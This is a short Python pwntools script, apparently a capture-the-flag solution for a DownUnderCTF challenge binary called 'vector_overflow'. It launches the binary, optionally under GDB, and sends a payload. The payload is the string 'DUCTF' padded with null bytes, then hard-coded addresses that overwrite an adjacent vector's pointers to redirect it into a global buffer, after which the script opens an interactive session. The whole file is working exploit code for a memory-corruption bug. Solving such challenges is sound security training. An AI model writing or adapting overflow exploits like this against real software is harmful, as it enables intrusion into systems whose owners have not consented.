#!/usr/bin/env python3
from pwn import *

exe = elf = context.binary = ELF(args.EXE or './vector_overflow')

context.terminal = ['tmux', 'splitw', '-h']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+73
b free
continue
'''.format(**locals())

io = start()
"""
-buf addr
0x4051e0
"""
payload  = b"DUCTF\x00\x00\x00"
payload += p64(0)
payload += p64(0x4051e0)
payload += p64(0x4051e5)

io.sendline(payload)

io.interactive()
